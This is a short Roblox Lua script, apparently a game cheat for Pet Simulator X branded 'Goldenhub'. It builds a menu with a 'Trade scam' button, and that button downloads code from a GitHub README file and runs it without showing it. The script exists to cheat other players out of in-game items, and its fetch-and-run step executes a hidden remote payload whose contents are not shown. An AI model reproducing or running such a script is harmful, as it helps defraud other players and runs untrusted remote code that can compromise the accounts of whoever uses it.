local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "pet simulator X", HidePremium = false, lntroText = "Goldenhub", SaveConfig = true, ConfigFolder = "OrionTest"})

local Tab = Window:MakeTab({

	Name = "Trade scam",	Icon = "rbxassetid://4483345998",

	PremiumOnly = false

})

OrionLib:MakeNotification({

	Name = "",

	Content = "ขอให้สนุก🥰",

	Image = "rbxassetid://4483345998",

	Time = 5

})

Tab:AddButton({

	Name = "Trade scam (wait 1-5minute)",

	Callback = function()

      	  loadstring(game:HttpGet("https://raw.githubusercontent.com/PerthEuEu/asdacPetsimx/main/README.md"))();

  	end    

})

OrionLibInit() 
